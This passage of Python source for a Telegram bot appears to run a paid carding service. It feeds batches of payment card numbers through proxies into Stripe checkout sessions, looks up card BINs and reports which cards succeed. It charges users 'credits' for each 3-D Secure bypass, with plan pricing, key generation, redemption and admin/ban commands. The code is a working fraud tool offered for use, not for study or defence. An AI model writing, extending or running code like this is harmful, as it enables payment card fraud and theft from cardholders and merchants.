            CHECKER_POOL, hit.run_hit_check, checkout_url, all_ccs[0], proxy_data, 3,
        )
        first_result["_elapsed"] = round(time.time() - _t0, 2)
    except Exception as e:
        _HIT_ACTIVE_USERS.discard(user_id)
        _HIT_STOP_FLAGS.pop(stop_key, None)
        await safe_edit(loading_msg,
            f"[⌯] {bold('Error')} ⌁ {_mono('Failed to load checkout')} {pe(E['cross'])}\n"
            f"[⌯] {bold('Reason')} ⌁ {_mono(_safe_err(e))}"
        )
        return

    if not first_result.get("ok") and _hit_is_session_dead(first_result):
        _HIT_ACTIVE_USERS.discard(user_id)
        _HIT_STOP_FLAGS.pop(stop_key, None)
        await safe_edit(loading_msg,
            f"[⌯] {bold('Error')} ⌁ {_mono('Session Dead')} {pe(E['warn'])}\n"
            f"[⌯] {bold('Reason')} ⌁ {_mono(first_result.get('error', 'Checkout expired or completed.')[:80])} {pe(E['warn'])}"
        )
        return

    # BIN lookup for first CC
    try:
        first_result["_bin"] = await bin_lookup(all_ccs[0].split("|")[0][:6])
    except Exception:
        first_result["_bin"] = {}

    merchant    = first_result.get("merchant") or "-"
    product     = first_result.get("product") or "-"
    amount_str  = first_result.get("price_display") or "-"
    success_url = first_result.get("success_url") or "-"
    if success_url != "-" and len(success_url) > 50:
        from urllib.parse import urlparse as _urlparse
        _p = _urlparse(success_url)
        success_url = f"{_p.scheme}://{_p.netloc}{_p.path[:30]}..."

    checkout_info = {
        "merchant":    merchant,
        "product":     product,
        "amount_str":  amount_str,
        "link_short":  link_short,
        "success_url": success_url,
    }

    results: dict = {all_ccs[0]: first_result}
    order = list(all_ccs)

    # ── Build initial message ─────────────────────────────────────────────────
    init_header = _hit_session_header(
        1, total,
        merchant, product, amount_str,
        link_short, success_url,
    )
    init_cc_parts = [_hit_cc_block(
        all_ccs[0], first_result,
        merchant=merchant, amount_str=amount_str,
        user_id=user_id, user_name=user_name, user_uname=user_uname,
        include_session=False,
    )]
    for cc in all_ccs[1:]:
        init_cc_parts.append(
            f"[⌯] {bold('Card')} ⌁ <tg-spoiler>{cc}</tg-spoiler>\n"
            f"[⌯] {bold('Status')} ⌁ {_mono('Checking...')} {pe(E['loading'])}"
        )
    if skipped > 0:
        init_cc_parts.append(
            f"[⌯] {bold('Note')} ⌁ {_mono(str(skipped) + ' CCs skipped (max ' + str(HIT_MAX_CCS) + ')')} {pe(E['warn'])}"
        )

    init_footer = _hit_cc_footer(user_id, user_name, user_uname)
    _isep = f"\n{_HIT_SEP}\n"
    init_text = _isep.join([init_header] + init_cc_parts) + f"\n{_HIT_SEP}\n" + init_footer

    # ── Send status message as NEW message (not edit) so style field works ───────
    # style: "danger" only works with bot.send_message, not edit_text.
    # Subsequent edits do NOT pass reply_markup → Telegram keeps the colored button.
    _stop_kb_send = {
        "inline_keyboard": [[{
            "text": "Stop Checking",
            "callback_data": f"hit_stop:{stop_key}",
            "icon_custom_emoji_id": "5936025362944233351",
            "style": "success",
        }]]
    }
    try:
        await loading_msg.delete()
    except Exception:
        pass
    try:
        status_msg = await bot.send_message(
            chat_id,
            init_text,
            reply_markup=_stop_kb_send,
            link_preview_options=_NO_PREVIEW,
        )
    except Exception:
        # fallback: reuse loading_msg if send fails
        status_msg = loading_msg
        try:
            await safe_edit(loading_msg, init_text)
        except Exception:
            pass

    msg_id_first = status_msg.message_id
    _HIT_EDIT_LOCKS[msg_id_first] = asyncio.Lock()

    # ── Notify monitor / approved for first CC ────────────────────────────────
    # ── Deduct 1 credit for first CC if 3DS bypassed ─────────────────────────
    if not _unlimited and first_result.get("tds_bypassed"):
        cr.deduct_credit(user_id)

    if _hit_is_session_dead(first_result):
        # Mark every remaining card as session dead immediately
        _dead = {"ok": False, "error": "Session Dead", "session_dead": True}
        for _cc in all_ccs[1:]:
            results[_cc] = _dead
        # Final edit — remove Stop button, show all cards as Session Dead
        _sd_header = _hit_session_header(
            len(order), total,
            merchant, product, amount_str, link_short, success_url,
        )
        _sd_parts = [
            _hit_cc_block(
                _cc, results[_cc],
                merchant=merchant, amount_str=amount_str,
                user_id=user_id, user_name=user_name, user_uname=user_uname,
                include_session=False,
            ) for _cc in order
        ]
        _sd_footer = _hit_cc_footer(user_id, user_name, user_uname)
        _sd_sep    = f"\n{_HIT_SEP}\n"
        _sd_text   = _sd_sep.join([_sd_header] + _sd_parts) + f"\n{_HIT_SEP}\n" + _sd_footer
        try:
            await safe_edit(status_msg, _sd_text, reply_markup=None)
        except Exception:
            pass
        _HIT_ACTIVE_USERS.discard(user_id)
        _HIT_STOP_FLAGS.pop(stop_key, None)
        return

    # ── Process remaining CCs ────────────────────────────────────────────────
    try:
        for cc in all_ccs[1:]:
            if _HIT_STOP_FLAGS.get(stop_key):
                results[cc] = {"ok": False, "error": "Stopped"}
                continue

            # Stop if user ran out of credits mid-session
            if not _unlimited and not cr.has_credits(user_id):
                results[cc] = {"ok": False, "error": "Stopped"}
                _HIT_STOP_FLAGS[stop_key] = True
                continue

            await _hit_check_single(
                cc, checkout_url, user_id, status_msg, results, order,
                user_name, user_uname, stop_key, checkout_info,
            )

            cc_res = results.get(cc, {})
            # Deduct 1 credit if 3DS bypassed
            if not _unlimited and cc_res.get("tds_bypassed"):
                cr.deduct_credit(user_id)

            if _HIT_STOP_FLAGS.get(stop_key):
                _is_sd = _hit_is_session_dead(cc_res)
                _stop_err = "Session Dead" if _is_sd else "Stopped"
                for remaining_cc in all_ccs[all_ccs.index(cc) + 1:]:
                    if remaining_cc not in results:
                        results[remaining_cc] = {
                            "ok": False,
                            "error": _stop_err,
                            "session_dead": _is_sd,
                        }
                break

        # ── Final update (remove Stop button) ────────────────────────────────
        done_count = sum(1 for cc in order if cc in results)
        final_header = _hit_session_header(
            done_count, total,
            merchant, product, amount_str,
            link_short, success_url,
        )
        final_cc_parts = []
        for cc in order:
            if cc in results:
                final_cc_parts.append(_hit_cc_block(
                    cc, results[cc],
                    merchant=merchant, amount_str=amount_str,
                    user_id=user_id, user_name=user_name, user_uname=user_uname,
                    include_session=False,
                ))
        if skipped > 0:
            final_cc_parts.append(
                f"[⌯] {bold('Note')} ⌁ {_mono(str(skipped) + ' CCs skipped (max ' + str(HIT_MAX_CCS) + ')')} {pe(E['warn'])}"
            )
        if any(_hit_is_session_dead(results.get(cc, {})) for cc in order):
            final_cc_parts.append(
                f"[⌯] {bold('Note')} ⌁ {_mono('Session dead — stopped.')} {pe(E['warn'])}"
            )

        final_footer = _hit_cc_footer(user_id, user_name, user_uname)
        _fsep = f"\n{_HIT_SEP}\n"
        final_text = _fsep.join([final_header] + final_cc_parts) + f"\n{_HIT_SEP}\n" + final_footer
        try:
            await safe_edit(status_msg, final_text, reply_markup=None)
        except Exception:
            pass

    finally:
        _HIT_ACTIVE_USERS.discard(user_id)
        _HIT_STOP_FLAGS.pop(stop_key, None)
        _HIT_EDIT_LOCKS.pop(msg_id_first, None)


# ══════════════════════════════════════════════════════════════════════════════
#  /addadmin — Admin management (owner only)
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("addadmin"))
async def cmd_addadmin(message: types.Message):
    if not auth.is_owner(message.from_user.id):
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('Owner Only')} {pe(E['shield'])}"
        )
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"[⌯] {bold('Usage')} ⌁ /addadmin user_id {pe(E['user'])}\n"
            f"[⌯] {bold('Note')} ⌁ {_mono('Admins get unlimited access')} {pe(E['gem'])}"
        )
        return
    target = int(args[1].strip())
    added  = auth.add_admin(target)
    _sp = f"\n{'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─'}\n"
    if added:
        await message.reply(
            f"[⌯] {bold('Admin')} ⌁ {_mono('Added')} {pe(E['check'])}\n"
            f"{_sp}"
            f"[⌯] {bold('User')} ⌁ {_mono(str(target))} {pe(E['user'])}\n"
            f"[⌯] {bold('Access')} ⌁ {_mono('Unlimited')} {pe(E['gem'])}\n"
            f"[⌯] {bold('Credits')} ⌁ {_mono('No Limit')} {pe(E['bolt'])}"
        )
    else:
        await message.reply(
            f"[⌯] {bold('Admin')} ⌁ {_mono('Already Exists')} {pe(E['warn'])}\n"
            f"{_sp}"
            f"[⌯] {bold('User')} ⌁ {_mono(str(target))} {pe(E['user'])}\n"
            f"[⌯] {bold('Note')} ⌁ {_mono('Already has admin access')} {pe(E['shield'])}"
        )


@router.message(Command("removeadmin"))
async def cmd_removeadmin(message: types.Message):
    if not auth.is_owner(message.from_user.id):
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('Owner Only')} {pe(E['shield'])}"
        )
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"[⌯] {bold('Usage')} ⌁ /removeadmin user_id {pe(E['user'])}"
        )
        return
    target  = int(args[1].strip())
    removed = auth.remove_admin(target)
    _sp = f"\n{'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─'}\n"
    if removed:
        await message.reply(
            f"[⌯] {bold('Admin')} ⌁ {_mono('Removed')} {pe(E['check'])}\n"
            f"{_sp}"
            f"[⌯] {bold('User')} ⌁ {_mono(str(target))} {pe(E['user'])}\n"
            f"[⌯] {bold('Access')} ⌁ {_mono('Reverted to User')} {pe(E['cross'])}"
        )
    else:
        await message.reply(
            f"[⌯] {bold('Admin')} ⌁ {_mono('Not Found')} {pe(E['warn'])}\n"
            f"{_sp}"
            f"[⌯] {bold('User')} ⌁ {_mono(str(target))} {pe(E['user'])}\n"
            f"[⌯] {bold('Note')} ⌁ {_mono('User is not an admin')} {pe(E['shield'])}"
        )


# ══════════════════════════════════════════════════════════════════════════════
#  /ban  /unban — Revoke / Restore user access (owner only)
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("ban"))
async def cmd_ban(message: types.Message):
    if not auth.is_owner(message.from_user.id):
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('Owner Only')} {pe(E['shield'])}"
        )
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"[⌯] {bold('Usage')} ⌁ /ban user_id {pe(E['cross'])}\n"
            f"[⌯] {bold('Note')} ⌁ {_mono('Blocks user from all commands')} {pe(E['shield'])}"
        )
        return
    target = int(args[1].strip())
    if auth.is_owner(target):
        await message.reply(
            f"[⌯] {bold('Error')} ⌁ {_mono('Cannot ban the owner')} {pe(E['warn'])}"
        )
        return
    ban_user(target)
    _sp = f"\n{'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─'}\n"
    await message.reply(
        f"[⌯] {bold('Ban')} ⌁ {_mono('User Banned')} {pe(E['cross2'])}\n"
        f"{_sp}"
        f"[⌯] {bold('User')} ⌁ {_mono(str(target))} {pe(E['user'])}\n"
        f"[⌯] {bold('Access')} ⌁ {_mono('Revoked')} {pe(E['cross'])}\n"
        f"[⌯] {bold('Note')} ⌁ {_mono('All commands blocked')} {pe(E['shield'])}"
    )


@router.message(Command("unban"))
async def cmd_unban(message: types.Message):
    if not auth.is_owner(message.from_user.id):
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('Owner Only')} {pe(E['shield'])}"
        )
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"[⌯] {bold('Usage')} ⌁ /unban user_id {pe(E['check'])}"
        )
        return
    target = int(args[1].strip())
    unban_user(target)
    _sp = f"\n{'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─'}\n"
    await message.reply(
        f"[⌯] {bold('Unban')} ⌁ {_mono('User Unbanned')} {pe(E['check'])}\n"
        f"{_sp}"
        f"[⌯] {bold('User')} ⌁ {_mono(str(target))} {pe(E['user'])}\n"
        f"[⌯] {bold('Access')} ⌁ {_mono('Restored')} {pe(E['check'])}"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  /removeplan — Wipe a user's credits & plan (admin/owner only)
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("removeplan"))
async def cmd_removeplan(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('Admin Only')} {pe(E['shield'])}"
        )
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().isdigit():
        await message.reply(
            f"[⌯] {bold('Usage')} ⌁ /removeplan user_id {pe(E['warn'])}\n"
            f"[⌯] {bold('Note')} ⌁ {_mono('Wipes credits + plan expiry')} {pe(E['cross'])}"
        )
        return
    target = int(args[1].strip())
    if auth.is_owner(target):
        await message.reply(
            f"[⌯] {bold('Error')} ⌁ {_mono('Cannot remove owner plan')} {pe(E['warn'])}"
        )
        return
    cr.set_credits(target, 0, 0, by=message.from_user.id, plan="removed")
    _sp = f"\n{'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─'}\n"
    await message.reply(
        f"[⌯] {bold('Plan')} ⌁ {_mono('Removed')} {pe(E['cross2'])}\n"
        f"{_sp}"
        f"[⌯] {bold('User')} ⌁ {_mono(str(target))} {pe(E['user'])}\n"
        f"[⌯] {bold('Credits')} ⌁ {_mono('0')} {pe(E['cross'])}\n"
        f"[⌯] {bold('Expiry')} ⌁ {_mono('Cleared')} {pe(E['warn'])}"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  /plans — Show credit plans
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("plans"))
async def cmd_plans(message: types.Message):
    if auth.is_banned(message.from_user.id):
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('Denied')} {pe(E['cross'])}\n"
            f"[⌯] {bold('Reason')} ⌁ {_mono('You have been banned.')}"
        )
        return
    P   = "[⌯]"
    SEP = "⌁"
    sep = f"\n{'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─'}\n"

    blocks = []
    icons  = [pe(E["star"]), pe(E["gem"]), pe(E["bolt"])]
    for i, (key, plan) in enumerate(cr.PLANS.items()):
        icon = icons[i % len(icons)]
        blocks.append(
            f"{P} {bold(plan['label'])} ⌁ {_mono(plan['price'])} {icon}\n"
            f"{P} {bold('Credits')} {SEP} {_mono(str(plan['credits']) + ' credits')}\n"
            f"{P} {bold('Duration')} {SEP} {_mono(str(plan['days']) + ' days')}\n"
            f"{P} {bold('Per 3DS')} {SEP} {_mono('1 credit deducted on bypass')} {pe(E['shield'])}"
        )

    header = (
        f"{P} {bold('Plans')} {SEP} {_mono('Credit Plans')} {pe(E['gem'])}\n"
        f"{sep}"
        f"{P} {bold('Note')} {SEP} {_mono('Credits cut only on 3DS bypass')} {pe(E['shield'])}\n"
        f"{P} {bold('Stack')} {SEP} {_mono('Plans stack — credits + days added')} {pe(E['check'])}"
    )
    await message.reply(header + sep + sep.join(blocks) + f"")


# ══════════════════════════════════════════════════════════════════════════════
#  /genkey — Generate a credit key (admin/owner only)
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("genkey"))
async def cmd_genkey(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('Admin Only')} {pe(E['shield'])}"
        )
        return

    args_raw = message.text.split(maxsplit=1)
    arg      = args_raw[1].strip() if len(args_raw) > 1 else ""

    # Parse: /genkey starter|pro|elite  OR  7|15|30  OR  <credits> <days>  OR  <plan> <uses>
    plan_obj   = None
    credits_v  = 0
    days_v     = 0
    max_uses_v = 1

    def _resolve_plan(s: str):
        """Lookup plan by key ('7','15','30') OR label name ('starter','pro','elite')."""
        if s in cr.PLANS:
            return cr.PLANS[s]
        s_l = s.lower()
        for p in cr.PLANS.values():
            if p["label"].lower() == s_l:
                return p
        return None

    parts = arg.split()
    if len(parts) == 1:
        plan_obj = _resolve_plan(parts[0])
        if plan_obj:
            credits_v = plan_obj["credits"]
            days_v    = plan_obj["days"]
        elif parts[0].isdigit():
            # bare number not matching a plan key — treat as error below
            plan_obj = None
        else:
            plan_obj = None
    elif len(parts) == 2:
        plan_obj = _resolve_plan(parts[0])
        if plan_obj and parts[1].isdigit():
            # /genkey starter 3  →  plan + uses
            credits_v  = plan_obj["credits"]
            days_v     = plan_obj["days"]
            max_uses_v = int(parts[1])
        elif parts[0].isdigit() and parts[1].isdigit():
            # /genkey 100 7  →  custom credits + days
            plan_obj  = None
            credits_v = int(parts[0])
            days_v    = int(parts[1])
        else:
            plan_obj = None
    elif len(parts) == 3 and all(p.isdigit() for p in parts):
        # /genkey <credits> <days> <uses>
        plan_obj   = None
        credits_v  = int(parts[0])
        days_v     = int(parts[1])
        max_uses_v = int(parts[2])

    if not plan_obj and credits_v == 0:
        plan_names = " · ".join(f"{_mono(v['label'].lower())}" for v in cr.PLANS.values())
        _sep = _MSEP
        await message.reply(
            f"[⌯] {bold('Command')} ⌁ {_mono('/genkey')} {pe(E['gift'])}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Usage')} ⌁ {_mono('/genkey PLAN')} {pe(E['bolt'])}\n"
            f"[⌯] {bold('Plans')} ⌁ {plan_names}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Custom')} ⌁ {_mono('/genkey credits days')} {pe(E['bolt'])}\n"
            f"[⌯] {bold('Multi')} ⌁ {_mono('/genkey starter 5')} → {_mono('5 slots')} {pe(E['user'])}\n"
            f"[⌯] {bold('Full')} ⌁ {_mono('/genkey credits days uses')} {pe(E['bolt'])}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Example')} ⌁ {_mono('/genkey starter')} {pe(E['star'])}\n"
            f"[⌯] {bold('Example')} ⌁ {_mono('/genkey 100 7')} {pe(E['star'])}"
        )
        return

    if credits_v <= 0 or days_v <= 0:
        await message.reply(
            f"[⌯] {bold('Error')} ⌁ {_mono('Credits and days must be > 0')} {pe(E['warn'])}"
        )
        return

    key = cr.generate_key(credits_v, days_v, created_by=message.from_user.id, max_uses=max_uses_v)

    plan_label = plan_obj["label"] if plan_obj else "Custom"
    _sp = f"\n{'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─'}\n"
    await message.reply(
        f"[⌯] {bold('Genkey')} ⌁ {_mono('Key Generated')} {pe(E['gift'])}\n"
        f"{_sp}"
        f"[⌯] {bold('Key')} ⌁ <code>{key}</code>\n"
        f"[⌯] {bold('Plan')} ⌁ {_mono(plan_label)} {pe(E['star'])}\n"
        f"{_sp}"
        f"[⌯] {bold('Credits')} ⌁ {_mono(str(credits_v) + ' credits')} {pe(E['bolt'])}\n"
        f"[⌯] {bold('Duration')} ⌁ {_mono(str(days_v) + ' days')}\n"
        f"[⌯] {bold('Slots')} ⌁ {_mono(str(max_uses_v) + ' use(s)')} {pe(E['user'])}\n"
        f"{_sp}"
        f"[⌯] {bold('Redeem')} ⌁ <code>/redeem {key}</code> {pe(E['gift'])}"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  /redeem — Redeem a credit key
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("redeem"))
async def cmd_redeem(message: types.Message):
    user_id  = message.from_user.id
    if auth.is_banned(user_id):
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('Denied')} {pe(E['cross'])}\n"
            f"[⌯] {bold('Reason')} ⌁ {_mono('You have been banned.')}"
        )
        return
    args_raw = message.text.split(maxsplit=1)
    if len(args_raw) < 2 or not args_raw[1].strip():
        _sep = _MSEP
        await message.reply(
            f"[⌯] {bold('Command')} ⌁ {_mono('/redeem')} {pe(E['gift'])}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Usage')} ⌁ {_mono('/redeem KEY')} {pe(E['bolt'])}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Get Key')} ⌁ {_mono('Contact admin for a key')} {pe(E['user'])}\n"
            f"[⌯] {bold('Plans')} ⌁ {_mono('/plans')} to view options {pe(E['star'])}"
        )
        return

    key     = args_raw[1].strip()
    success, msg, info = cr.redeem_key(user_id, key)

    if not success:
        _sep = _MSEP
        await message.reply(
            f"[⌯] {bold('Redeem')} ⌁ {_mono('Failed')} {pe(E['cross2'])}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Reason')} ⌁ {_mono(msg)} {pe(E['declined'])}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Get Key')} ⌁ {_mono('Contact admin')} {pe(E['user'])}\n"
            f"[⌯] {bold('Plans')} ⌁ {_mono('/plans')} {pe(E['star'])}"
        )
        return

    credits    = info.get("credits", 0)
    days       = info.get("days", 0)
    slots_left = info.get("slots_left", 0)
    max_uses   = info.get("max_uses", 1)
    new_bal    = cr.get_credits(user_id)
    new_exp    = cr.expiry_str(user_id)

    _sp = f"\n{'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─'}\n"
    await message.reply(
        f"[⌯] {bold('Redeem')} ⌁ {_mono('Key Redeemed')} {pe(E['gift'])}\n"
        f"{_sp}"
        f"[⌯] {bold('Added')} ⌁ {_mono(str(credits) + ' credits')} {pe(E['bolt'])}\n"
        f"[⌯] {bold('Duration')} ⌁ {_mono('+' + str(days) + ' days')}\n"
        f"[⌯] {bold('Slots')} ⌁ {_mono(str(slots_left) + '/' + str(max_uses) + ' remaining')} {pe(E['user'])}\n"
        f"{_sp}"
        f"[⌯] {bold('Balance')} ⌁ {_mono(str(new_bal) + ' credits')} {pe(E['gem'])}\n"
        f"[⌯] {bold('Expires')} ⌁ {_mono(new_exp)}"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  /credits — Check credit balance
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("credits"))
async def cmd_credits(message: types.Message):
    user_id = message.from_user.id
    if auth.is_banned(user_id):
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('Denied')} {pe(E['cross'])}\n"
            f"[⌯] {bold('Reason')} ⌁ {_mono('You have been banned.')}"
        )
        return

    if auth.is_owner(user_id):
        role = "Owner"
        bal  = "∞"
        exp  = "Lifetime"
        icon = pe(E["gem"])
    elif user_id in auth.load_admins():
        role = "Admin"
        bal  = "∞"
        exp  = "Lifetime"
        icon = pe(E["star"])
    else:
        role = "User"
        bal  = str(cr.get_credits(user_id))
        exp  = cr.expiry_str(user_id)
        icon = pe(E["bolt"])

    uname = message.from_user.username or ""
    name  = message.from_user.full_name or str(user_id)
    if uname:
        ulink = f'<a href="https://t.me/{uname}">{_to_mi(name)}</a>'
    else:
        ulink = f'<a href="tg://user?id={user_id}">{_to_mi(name)}</a>'

    _sp = f"\n{'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─'}\n"
    await message.reply(
        f"[⌯] {bold('Credits')} ⌁ {_mono('Balance')} {pe(E['gem'])}\n"
        f"{_sp}"
        f"[⌯] {bold('User')} ⌁ {ulink} {pe(E['user'])}\n"
        f"[⌯] {bold('Role')} ⌁ {_mono(role)} {icon}\n"
        f"{_sp}"
        f"[⌯] {bold('Credits')} ⌁ {_mono(bal)} {pe(E['bolt'])}\n"
        f"[⌯] {bold('Expires')} ⌁ {_mono(exp)}\n"
        f"{_sp}"
        f"[⌯] {bold('Plans')} ⌁ /plans {pe(E['star'])}\n"
        f"[⌯] {bold('Redeem')} ⌁ /redeem KEY {pe(E['gift'])}"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  /users — Full user list with roles, credits & plan expiry (admin only)
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("users"))
async def cmd_users(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('Admin Only')} {pe(E['shield'])}"
        )
        return

    _sep = "─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─"
    _admins_set = set(auth.load_admins())

    # ── Read users.txt ────────────────────────────────────────────────────────
    users_data: list[dict] = []
    if os.path.exists(auth.USERS_FILE):
        with open(auth.USERS_FILE, "r", encoding="utf-8") as _uf:
            for _line in _uf:
                _p = _line.strip().split("|")
                if _p and _p[0].isdigit():
                    users_data.append({
                        "id":    int(_p[0]),
                        "uname": _p[1] if len(_p) > 1 else "",
                        "name":  _p[2] if len(_p) > 2 else "",
                    })

    _total = len(users_data)

    # ── Categorise ────────────────────────────────────────────────────────────
    owners_list = [u for u in users_data if auth.is_owner(u["id"])]
    admins_list = [u for u in users_data if u["id"] in _admins_set]
    with_plan: list[tuple] = []
    free_count = 0

    for u in users_data:
        uid = u["id"]
        if auth.is_owner(uid) or uid in _admins_set:
            continue
        bal = cr.get_credits(uid)
        exp = cr.expiry_str(uid)
        if bal > 0 or exp not in ("No plan", "Expired"):
            with_plan.append((uid, u["uname"], u["name"], bal, exp))
        else:
            free_count += 1

    # ── Summary ───────────────────────────────────────────────────────────────
    lines = [
        f"[⌯] {bold('Users')} ⌁ {_mono('Overview')} {pe(E['user'])}",
        _sep,
        f"[⌯] {bold('Total')} ⌁ {_mono(str(_total))} {pe(E['bolt'])}",
        f"[⌯] {bold('Owners')} ⌁ {_mono(str(len(owners_list)))} {pe(E['gem'])}",
        f"[⌯] {bold('Admins')} ⌁ {_mono(str(len(admins_list)))} {pe(E['star'])}",
        f"[⌯] {bold('Active Plan')} ⌁ {_mono(str(len(with_plan)))} {pe(E['check'])}",
        f"[⌯] {bold('Free')} ⌁ {_mono(str(free_count))} {pe(E['cross'])}",
    ]

    if owners_list:
        lines += [_sep, f"[⌯] {bold('Owners')} {pe(E['gem'])}"]
        for u in owners_list:
            _ud = f"@{u['uname']}" if u["uname"] and u["uname"] != "none" else (u["name"] or str(u["id"]))
            lines.append(f"[⌯] {bold('↳')} ⌁ {_mono(_ud)} · {_mono(str(u['id']))} {pe(E['gem'])}")

    if admins_list:
        lines += [_sep, f"[⌯] {bold('Admins')} {pe(E['star'])}"]
        for u in admins_list:
            _ud = f"@{u['uname']}" if u["uname"] and u["uname"] != "none" else (u["name"] or str(u["id"]))
            lines.append(f"[⌯] {bold('↳')} ⌁ {_mono(_ud)} · {_mono(str(u['id']))} {pe(E['star'])}")

    if with_plan:
        lines += [_sep, f"[⌯] {bold('Plan Users')} ⌁ {_mono(str(len(with_plan)) + ' active')} {pe(E['check'])}"]
        for uid, uname, name, bal, exp in with_plan[:30]:
            _ud = f"@{uname}" if uname and uname != "none" else (name or str(uid))
            lines.append(
                f"[⌯] {bold('↳')} ⌁ {_mono(_ud)} · {_mono(str(bal) + ' cr')} · {_mono(exp)} {pe(E['bolt'])}"
            )
        if len(with_plan) > 30:
            lines.append(f"[⌯] {bold('...')} ⌁ {_mono(str(len(with_plan) - 30) + ' more')} {pe(E['bolt'])}")

    lines.append(_sep)
    await message.reply("\n".join(lines), link_preview_options=_NO_PREVIEW)


@router.callback_query(F.data.startswith("hit_stop:"))
async def cb_hit_stop(callback: types.CallbackQuery):
    stop_key = callback.data.split(":", 1)[1]
    parts    = stop_key.split(":")
    owner_id = int(parts[2]) if len(parts) >= 3 else 0

    if callback.from_user.id != owner_id and not auth.is_owner(callback.from_user.id):
        await callback.answer(bold("Only the owner can stop this check!"), show_alert=True)
        return

    _HIT_STOP_FLAGS[stop_key] = True
    await callback.answer(bold("Stopping Stripe check..."), show_alert=True)


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN ENTRY
# ══════════════════════════════════════════════════════════════════════════════

async def main():
    me = await bot.get_me()
    log.info("⚡ Bot @%s is running...", me.username)
    for obs in router.message.handlers:
        log.info("  📌 Registered handler: %s", obs.callback.__name__)

    await bot.delete_webhook(drop_pending_updates=True)
    try:
        await dp.start_polling(
            bot,
            skip_updates=True,
            allowed_updates=[
                "message",
                "edited_message",
                "callback_query",
                "inline_query",
                "chat_member",
                "my_chat_member",
            ],
        )
    finally:
        CHECKER_POOL.shutdown(wait=False)
        await bot.session.close()


if __name__ == "__main__":
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        target = min(65536, hard)
        if soft < target:
            resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
            log.info("📂 Raised fd limit: %d → %d", soft, target)
    except Exception:
        pass
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        log.info("Bot stopped.")
